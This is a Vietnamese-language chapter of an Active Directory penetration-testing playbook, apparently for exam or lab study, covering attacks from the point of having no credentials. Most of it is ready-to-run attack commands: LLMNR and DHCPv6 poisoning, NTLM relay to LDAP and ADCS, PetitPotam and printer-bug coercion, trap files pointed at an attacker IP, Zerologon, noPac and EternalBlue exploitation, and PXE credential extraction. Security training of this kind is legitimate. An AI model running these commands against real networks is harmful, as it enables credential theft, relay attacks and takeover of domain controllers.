# 01 — No Credentials (chưa có tài khoản nào)

**Trạng thái:** bạn chỉ có kết nối mạng tới môi trường AD, chưa có user/password.
**Mục tiêu:** ra được `Username`, `User + Pass`, hoặc một `Hash` (NetNTLM/ASREP)
để crack. Đây là cột trái cùng của mindmap.

---

## A. Scan network (quét mạng)

> **Khi nào chạy:** ngay đầu, để tìm host sống và xác định DC.
> **Tại sao:** DC lộ qua port 88 (Kerberos) + 389 (LDAP) + 53 (DNS). Biết DC →
> biết domain → mọi bước sau.

Các box lệnh quét (theo mindmap, tăng dần độ chi tiết):

```bash
nxc smb <ip_range>                                   # map SMB: tên máy, domain, OS, signing
nmap -sP -p <ip>                                     # ping sweep tìm host sống
nmap -Pn -sV --top-ports 50 --open <ip>             # 50 port phổ biến
nmap -Pn -sC -sV -oA <output> <ip>                  # script mặc định + version
nmap -Pn -sC -sV -p- -oA <output> <ip>              # toàn bộ 65535 port TCP
nmap -sU -sC -sV -oA <output> <ip>                  # UDP
nmap -p 88 --open <ip_range>                         # tìm DC (Kerberos)
nmap -n -sV --script 'ldap* and not brute' -p 389 <dc_ip>   # thông tin LDAP rootDSE
```

- **Kết quả:** danh sách host, port, `smb-os-discovery`/`ldap-rootdse` cho ra
  **tên domain + hostname DC** → thêm vào `/etc/hosts`.
- `nxc smb <range>` còn báo `signing:False` → máy đó **relay được** (mục F).

### Find DC IP

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>    # nếu đã biết tên domain
```

### Scan tự động lỗ hổng SMB

```bash
nmap -Pn --script 'smb-vuln*' -p139,445 <ip>        # phát hiện MS17-010, SMBGhost...
nuclei -target <ip_range>                            # quét template lỗ hổng web/service
nessus                                               # scanner thương mại (nếu có)
```

---

## B. SMB null / guest & anonymous

> **Khi nào chạy:** luôn thử — nhiều DC/lab cho phép truy cập ẩn danh.
> **Tại sao:** null session liệt kê được share, user, chính sách mật khẩu mà
> không cần credential.

```bash
nxc smb <ip_range> -u '' -p ''                       # null session
nxc smb <ip_range> -u 'a' -p ''                      # guest (user bất kỳ, pass rỗng)
enum4linux-ng.py -a -u '' -p '' <ip>                 # tự động hoá toàn bộ enum
smbclient -U '%' -L //<ip>                           # liệt kê share ẩn danh
```

- **Kết quả:** danh sách share (`--shares`), user (`--users`/`--rid-brute`),
  pass-policy. Box **"Anonymous & Guest access on SMB shares"** → vào đọc file.
- **Tiếp theo:** nếu đọc được share → tìm file chứa mật khẩu (xem file 03 §GPP,
  và box "Search files").

---

## C. Enumerate LDAP (anonymous)

> **Khi nào chạy:** DC cho phép anonymous bind (một số cấu hình cũ).
> **Tại sao:** đọc cây thư mục → user, mô tả (`description`), đôi khi mật khẩu.

```bash
ldapsearch -x -H ldap://<dc_ip> -s base              # rootDSE: lấy namingContext
```

- **Kết quả:** `defaultNamingContext: DC=corp,DC=local` → dùng cho các truy vấn
  LDAP tiếp theo. Nếu bind ẩn danh đọc được object → sang file 03 (enum đầy đủ).

---

## D. Username enumeration qua Kerberos

> **Khi nào chạy:** đã biết tên domain, cần danh sách user hợp lệ mà **không** gây
> khóa tài khoản.
> **Tại sao:** KDC trả lời khác nhau cho user tồn tại/không tồn tại; không sinh
> event đăng nhập thất bại.

```bash
kerbrute userenum -d <domain> <userlist>             # nhanh nhất, không lock
nmap -p 88 --script=krb5-enum-users \
  --script-args="krb5-enum-users.realm=<domain>,userdb=<user_list_file>" <dc_ip>
nxc smb <dc_ip> --users                              # nếu đã có chút quyền
nxc smb <dc_ip> --rid-brute 10000                    # brute RID → user/group
```

- **Kết quả:** box **"Username"** — danh sách user hợp lệ → chuyển sang
  [file 02](02-valid-user-no-password.md) (AS-REP roast / spray).
- Wordlist: lấy từ OSINT (trang team công ty) + `username-anarchy`.

---

## E. Poisoning (LLMNR / NBT-NS / mDNS / DHCPv6)

> **Khi nào chạy:** bạn **ở trong cùng LAN** với nạn nhân (sau khi pivot, hoặc
> lab assume cùng mạng).
> **Tại sao:** Windows broadcast hỏi tên khi DNS fail → bạn trả lời giả → nạn
> nhân gửi **NetNTLM hash** → crack offline (NetNTLMv2 không PtH được).

```bash
responder -I <interface>                             # đầu độc LLMNR/NBT-NS/mDNS
responder -I <interface> # --lm để ép hạ cấp xuống NTLMv1 (dễ crack hơn)
mitm6 -d <domain>                                    # ⚠️ DHCPv6: Windows ưu tiên IPv6 → ép dùng DNS của bạn
bettercap                                            # ARP poisoning (⚠️ ồn, dễ sập mạng lab)
Pcredz -i <interface> -v                             # trích hash/credential từ traffic bắt được
```

- **Kết quả:** box **"Hash NTLMv1 or NTLMv2"** — hash lưu ở
  `/usr/share/responder/logs/`. Crack: `hashcat -m 5600` (v2) / `-m 5500` (v1).
  Nếu crack được → `User + Pass`.
- **Biến thể "ép xác thực":** đặt file bẫy UNC trên share ghi được (xem mục G
  "Drop file") để sinh traffic cho Responder.

---

## F. NTLM Relay (Man-In-The-Middle: Listen and Relay)

> **Khi nào chạy:** có xác thực NTLM đi qua mạng (từ poisoning/coerce) **và** máy
> đích **không bắt buộc SMB signing**.
> **Tại sao:** thay vì crack, chuyển tiếp phiên xác thực tới máy khác để đăng
> nhập dưới danh tính nạn nhân.

```bash
# 1) Tìm máy không ký SMB (relay được)
nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt

# 2) Relay — xem đích trong file 14 (LDAP/SMB/HTTP/MSSQL/ADCS)
ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks   # → SMB socks
ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive   # → LDAP shell
ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support \
   --add-computer <computer_name> <computer_password> --delegate-access    # → RBCD
ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController  # → ESC8

# 3) Kích hoạt luồng xác thực
responder -I <interface>          # (tắt SMB/HTTP trong Responder.conf trước)
```

- **Kết quả:** tuỳ đích — dump SAM, LDAP shell, tạo RBCD, hoặc chứng chỉ DC.
  Chi tiết từng đích ở [file 14](14-ntlm-relay.md).
- Biến thể relay có CVE: **Remove mic (CVE-2019-1040)**, **PrivExchange
  (CVE-2019-0724/0686)**, **MS08-068 self relay** (⚠️ `msf`, Windows 2000/2008).

---

## G. Coerce (ép máy xác thực)

> **Khi nào chạy:** cần "mồi" xác thực để poisoning/relay; thường cần 1 credential
> thấp (trừ PetitPotam unauth trên DC chưa vá CVE-2022-26925).
> **Tại sao:** ép một máy (kể cả DC) kết nối UNC về bạn → sinh xác thực NTLM/Kerberos.

```bash
petitpotam.py -d <domain> <listener> <target>                       # MS-EFSR (unauth nếu vá thiếu)
petitpotam.py -u '<user>' -p '<password>' -d '<domain>' <listener> <target>
printerbug.py <domain>/<username>:<password>@<printer_ip> <listener_ip>   # MS-RPRN (spooler)
coercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>   # tổng hợp nhiều method
dnstool.py -u <domain>\<user> -p <pass> --record 'attacker' \
   --action add --data <ip_attacker> <dc_ip>                          # thêm DNS record để coerce qua tên
```

- **Kết quả:** máy đích gửi xác thực của **tài khoản máy** (`DC01$`) → kết hợp
  relay (ESC8, LDAP→RBCD) hoặc unconstrained delegation để tiến tới DA.
- **Webdav coerce (HTTP):** bật webclient rồi thả file `.searchConnector-ms`:
  ```bash
  nxc smb <dc_ip> -u '<user>' -p '<password>' -M drop-sc    # thả file kích hoạt WebClient
  ```

### Drop file (file bẫy UNC để poisoning/coerce qua share ghi được)

```bash
nxc smb <dc_ip> -u '<user>' -p '<password>' -M slinky -o NAME=<filename> SERVER=<attacker_ip>  # .lnk
nxc smb <dc_ip> -u '<user>' -p '<password>' -M sucffy -o NAME=<filename> SERVER=<attacker_ip>  # .scf
ntlm_theft.py -g all -s <your_ip> -f test            # sinh đủ loại file bẫy (.url, .lnk, .scf...)
```

File `.url` mẫu: `[InternetShortcut]` + `IconFile=\\<attacker_ip>\%USERNAME%.icon`.

---

## H. Known vulnerabilities (exploit không cần credential)

> **Khi nào chạy:** scan thấy máy chưa vá. ⚠️ **Cân nhắc kỹ trong thi** — một số
> phá hoại; ZeroLogon unsafe hỏng DC.

| Box mindmap | Lệnh | Ghi chú |
|-------------|------|---------|
| **Zerologon (safe)** CVE-2020-1472 | `zerologon-scan '<dc_netbios>' '<ip>'` | Scan trước; cách safe khôi phục được |
| **Zerologon (unsafe)** ⚠️ | `cve-2020-1472-exploit.py <NETBIOS> <ip>` | Reset mật khẩu DC → có thể hỏng domain |
| **EternalBlue MS17-010** | `msf> exploit/windows/smb/ms17_010_eternalblue` | ⚠️ SMBv1, máy cũ; `msf` |
| **SMBGhost CVE-2020-0796** | — (scan qua `smb-vuln`) | Win10/2019 1903/1909 |
| **noPac** (CVE-2021-42278/42287) | `nxc smb <ip> -u 'user' -p 'pass' -M nopac` | Cần 1 user thường → DA |
| **PrintNightmare** (CVE-2021-1675/34527) | `nxc smb <ip> -u 'user' -p 'pass' -M printnightmare` | Cần credential |
| **CVE-2022-33679** | `CVE-2022-33679.py <domain>/<user> <target>` | Kerberos, không cần pass |
| **MS14-068** | `ms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_fqdn>` | DC rất cũ → forge PAC |

- **Kết quả:** thường ra **Admin/Domain admin** trực tiếp (ZeroLogon, noPac,
  EternalBlue) hoặc shell SYSTEM trên máy.

---

## I. PXE / SCCM (không cần credential)

> **Khi nào chạy:** môi trường có **SCCM** và PXE boot bật (hay gặp trong doanh
> nghiệp lớn / lab AD nâng cao).
> **Tại sao:** ảnh PXE boot chứa credential triển khai → lấy được tài khoản.

```bash
pxethief.py 1                                        # tìm distribution point
pxethief.py 2 <distribution_point_ip>                # lấy thông tin boot
tftp -i <dp_ip> GET "\xxx\boot.var"                  # tải file boot qua TFTP
pxethief.py 5 '\xxx\boot.var'                         # trích credential từ boot media
```

- **Kết quả:** box **"PXE Hash"** (`$sccm$aes128$…`, crack `-m 19850`) hoặc
  credential trực tiếp. Toàn bộ nhánh SCCM ở [file 10](10-sccm.md).

---

## Checklist "No Credentials"

- [ ] `nxc smb <range>` + nmap DC → `/etc/hosts`
- [ ] Null/guest/anonymous SMB + LDAP
- [ ] kerbrute userenum → `Username` → [file 02](02-valid-user-no-password.md)
- [ ] Cùng LAN? → Responder/mitm6 → NetNTLM → crack
- [ ] Relay được (signing off)? → ntlmrelayx ([file 14](14-ntlm-relay.md))
- [ ] Coerce (PetitPotam/printerbug) làm mồi
- [ ] Máy chưa vá? → known vulns (⚠️ thi)
- [ ] Có SCCM/PXE? → [file 10](10-sccm.md)
